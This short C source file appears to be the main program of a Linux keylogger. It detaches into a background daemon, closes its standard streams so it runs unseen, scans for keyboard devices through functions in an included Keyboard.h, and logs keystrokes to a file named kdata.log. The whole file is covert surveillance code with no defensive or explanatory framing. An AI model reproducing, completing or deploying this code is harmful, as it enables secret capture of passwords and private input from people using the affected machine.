#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <syslog.h>
#include "Keyboard.h"

void DEAMON()
{
  //Process IDand session ID
  pid_t pid, sid;

  pid = fork(); //Fork of the parent Process
  if(pid < 0)
    exit(EXIT_FAILURE);
  if(pid > 0)
    exit(EXIT_SUCCESS);
  umask(0); //Change file mode umask
  sid = setsid();

  if(sid < 0)
    exit(EXIT_FAILURE);

  if((chdir("/")) < 0) //Change current working directory
    exit(EXIT_FAILURE);

  //Close standard output file descriptors
  close(STDIN_FILENO);
  close(STDOUT_FILENO);
  close(STDERR_FILENO);
}

int main(int argc , char *argv[])
{
  DEAMON();
  struct Keyboard kb[10];

  int keyboard_count = 0;
  char *dev[10] , *log_p[10];
  KeyboardScan(&keyboard_count , 10 , dev , log_p);

  int i = 0;
  for( ; i < keyboard_count; i++)
  {
    strcpy(kb[i].devPath , dev[i]);
    strcpy(kb[i].log_path, "kdata.log");
    kb[i].shift = 0;
    kb[i].caps = 0;
  }

  log_data(kb[0]);

  _exit(0);
}
